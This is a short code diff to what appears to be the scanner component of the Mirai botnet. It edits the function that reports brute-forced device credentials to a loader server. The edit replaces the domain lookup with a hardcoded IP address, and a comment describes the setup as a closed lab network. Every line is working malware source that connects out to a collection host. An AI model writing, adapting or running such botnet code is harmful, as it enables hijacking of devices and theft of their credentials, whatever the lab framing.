@@ -900,7 +900,6 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
 {
     struct sockaddr_in addr;
     int pid = fork(), fd;
-    struct resolv_entries *entries = NULL;
 
     if (pid > 0 || pid == -1)
         return;
@@ -913,23 +912,13 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
         exit(0);
     }
 
-    table_unlock_val(TABLE_SCAN_CB_DOMAIN);
     table_unlock_val(TABLE_SCAN_CB_PORT);
 
-    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));
-    if (entries == NULL)
-    {
-#ifdef DEBUG
-        printf("[report] Failed to resolve report address\n");
-#endif
-        return;
-    }
+    /* Lab: report to loader by IP (closed network — no DNS / no report.lab). */
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+    addr.sin_addr.s_addr = INET_ADDR(185, 10, 20, 200);
     addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
-    resolv_entries_free(entries);
 
-    table_lock_val(TABLE_SCAN_CB_DOMAIN);
     table_lock_val(TABLE_SCAN_CB_PORT);
 
     if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
